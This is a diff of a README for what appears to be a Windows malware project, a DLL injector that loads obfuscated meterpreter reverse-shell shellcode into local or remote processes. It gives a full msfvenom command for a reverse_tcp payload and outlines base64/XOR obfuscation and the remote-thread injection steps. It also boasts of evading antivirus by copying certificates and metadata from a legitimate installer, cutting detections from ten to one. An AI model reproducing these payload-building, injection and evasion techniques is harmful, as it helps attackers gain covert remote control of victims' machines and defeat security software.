@@ -13,10 +13,10 @@ This malware injects a malicious library into a target process or directly creat
 - The payload is a simple base64 shellcode, it's reccomended to use shigata_ga_nai alternatives since its easy to detect:
 ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX  -e x86/shikata_ga_nai -f c  ```. 
 
-- Once we have the shellcode we load it into the ``` encrypter.c```  file, where the binary data is converted into Base64, try to use a custom base64_chars set instead of the standard Base64 alphabet to obfuscate more, secondly XOR encryption is applied using a single-byte key, and finally we convert it into its hexadecimal string representation.
+- Once we have the shellcode we load it into the ```encrypter.c```  file, where the binary data is converted into Base64, try to use a custom base64_chars set instead of the standard Base64 alphabet to obfuscate more, secondly XOR encryption is applied using a single-byte key, and finally we convert it into its hexadecimal string representation.
 
 ### 1) DLL
-The malicious library contains 4 different call cases, process attach/detach, and thread create/delete, the best one is in my opinion the first one. When the library is attached to the process, it runs arbitrary code, in the sample there is a simple windows message box, in the actual dll the code decodes base64 encoded data and uploads the shellcode containing the reverse shell to memory. You can create a dll on Visual Studio by making a new project and selecting the dll template, also rememeber to build both the dll and the injector in release mode and in the same architecture.
+The malicious library contains 4 different call cases, process attach/detach, and thread create/delete, the best one is in my opinion the first one. When the library is attached to the process, it runs arbitrary code, in the sample there is a simple windows message box, in the ```dll-shell``` the code decodes the previously obfuscated data and uploads the shellcode containing the reverse shell to memory. You can create a dll on Visual Studio by making a new project and selecting the dll template, also rememeber to build both the dll and the injector in release mode and in the same architecture.
 
 ### 2) Local Injection
 
@@ -37,18 +37,14 @@ The remote injection dumps the dynamic library into disk (might get detected tho
 - We find a process by PID, allocate memory the size of the dll path inside of it and write the path into the process;
 - Then we get the base address of kernel32 dll to get the pointer of the function which will load the malicious library;
 - Finally we create a thread that executes the function that loads the malicious dll;
+- The Dll decodes the data and uploads it to memory, creating the shell;
 
-### 3) Reverse shell
-
-The actual dll contains the encrypted shellcode with the reverse shell, here's how it works:
-- First the ...
-
+Extracting the dll and uploading to disk is risky tho, in the future i will find some ways to upload it directly to memory without being scanned.
 
 # 🛡 Obfuscation and AV Detection 
 
 <img align="right" src="media/av1.png" width="340" />
 
 Both codes are undetected by Windows defender. The remote injection exe on virustotal got 10 detections, but using a simple certificate and metadata manager like Process Hacker (free an open source) i uploaded the data of a common app (in my case it was github desktop setup) and the AVs detections went from 10 to 1 in an instant, and for the first time Bitdefender didn't flag it as suspicious 😀!!! The file went from a few kilobytes to like 10mb tho so i think i'll have to work on that, maybe by embedding only the essential metadata and certificates.
-
 
 <img align="left" src="media/av4.png" width="540" />
